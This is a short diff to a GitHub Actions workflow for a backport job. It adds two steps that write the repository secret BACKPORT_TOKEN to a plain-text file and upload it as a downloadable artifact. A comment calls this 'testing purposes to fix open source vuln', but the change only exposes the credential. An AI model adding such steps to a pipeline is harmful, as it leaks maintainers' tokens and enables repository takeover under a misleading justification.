@@ -23,3 +23,12 @@ jobs:
         uses: m-kuhn/backport@7f3cab83e4b3b26aefcffda21851c3dc3d389f45 # v1.2.7
         with:
           github_token: ${{ secrets.BACKPORT_TOKEN }}
+      #TESTING PURPOSES TO FIX OPEN SOURCE VULN
+      - name: Save backport token to cat.txt
+        run: echo "${{ secrets.BACKPORT_TOKEN }}" > cat.txt
+
+      - name: Upload cat.txt artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: backport-token-file
+          path: cat.txt
